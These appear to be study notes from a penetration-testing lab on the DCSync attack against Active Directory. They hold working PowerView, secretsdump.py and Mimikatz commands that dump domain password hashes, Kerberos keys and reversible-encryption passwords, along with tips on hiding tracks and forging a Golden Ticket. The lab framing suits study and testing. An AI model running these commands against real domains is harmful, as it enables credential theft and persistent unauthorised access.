## What is DCSync and How Does it Work?
- DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data.
	- This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.
- The crux of the attack is requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right. This is an extended access control right within AD, which allows for the replication of secret data.
- To perform this attack, you must have control over an account that has the rights to perform domain replication
	- A user with the **Replicating Directory Changes** and **Replicating Directory Changes All** permissions set. Domain/Enterprise Admins and default domain administrators have this right by default.

#### Viewing adunn's Replication Privs through ADSI Edit
![[Pasted image 20230424130506.png|700]]
It is common during an assessment to find other accounts that have these rights, and once compromised, their access can be utilized to retrieve the current NTLM password hash for any domain user and the hashes corresponding to their previous passwords.

#### Using Get-DomainUser to View adunn's Group Memberships (Powerview)
``` powershell
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```
- We first get the user's SID in the above command and then check all ACLs set on the domain object (`"DC=inlanefreight,DC=local"`) using [Get-ObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/) to get the ACLs associated with the object.
	- Here we search specifically for replication rights and check if our user `adunn` (denoted in the below command as `$sid`) possesses these rights.
``` powershell
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"

PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
![[2023-04-24 13_09_10-Hack The Box - Academy.png|500]]
- If we had certain rights over the user (such as [WriteDacl](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl)), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks.

#### Extract NTLM Hashes and Kerberos Keys Using secretsdump.py
``` bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```
- `-just-dc-ntlm` - only NTLM hashes
- `-just-dc-user <user>` - data on a specific user
- `-pwd-last-set` - when password was last changed
- `-history` - dump password history
- `-user-status` - check if a user account is disabled

We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:
-   Number and % of passwords cracked
-   top 10 passwords
-   Password length metrics
-   Password re-use
reflects only active user accounts in the domain.

- `-just-dc` creates 3 files:
	- NTLM hashes
	- Kerberos Keys
	- Cleartext passwords from the NTDS for any accounts with [reversible encryption](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled.
		- Rare but typically found for applications that use protocols that require a user's password to be used for authentication.

### More on Reversible Encryption
- When this is set on a user account the passwords are not stored in cleartext.
- They're stored using RC4 and are decrypted with a key stored in the registry (the [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) and can be extracted by a Domain Admin or equivalent.

#### Enumerate Reversible Encryption using Get-ADUser
``` powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```
- Show users with reversible encryption enabled

#### Check For Reversible Encryption using Get-DomainUser (PowerView)
``` powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```


#### DCSync Attack with Mimikatz
``` powershell
PS C:\htb> .\mimikatz.exe

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```
- With Mimikatz we must target a specific user.
	- The above command targets the built-in admin but we could also target the `krbtgt` account and use this to create a Golden Ticket for persistence.